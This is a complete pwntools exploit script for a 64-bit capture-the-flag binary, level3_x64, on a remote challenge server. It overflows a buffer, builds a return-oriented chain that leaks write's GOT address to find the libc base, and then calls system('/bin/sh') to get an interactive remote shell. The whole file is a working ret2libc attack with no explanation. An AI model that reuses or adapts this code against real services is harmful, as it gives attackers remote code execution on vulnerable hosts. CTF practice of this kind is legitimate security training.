#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9883)
#p = process('./level3_x64')
elf = ELF('./level3_x64')
libc = ELF('./libc-2.19.so')

write_plt = elf.symbols['write']
write_got = elf.got['write']
offset = 0x80
vul = 0x4005E6
pop_rdi = 0x00000000004006b3
pop_rsi = 0x00000000004006b1

payload = 'A' * offset + 'deadbeef'
payload+= p64(pop_rdi) + p64(1)
payload+= p64(pop_rsi) + p64(write_got) + 'anything' #rsi and r15
payload+= p64(write_plt) + p64(vul)
p.sendline(payload)

p.recvuntil('Input:\n')
write_got = u64(p.recv(8))
libc_base = write_got - libc.symbols['write']
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh').next()
success(hex(libc_base))


payload = 'A' * offset + 'deadbeef' + p64(pop_rdi) + p64(sh) + p64(system) + 'deadbeef'
p.recvuntil('Input:\n')
p.sendline(payload)

p.interactive()
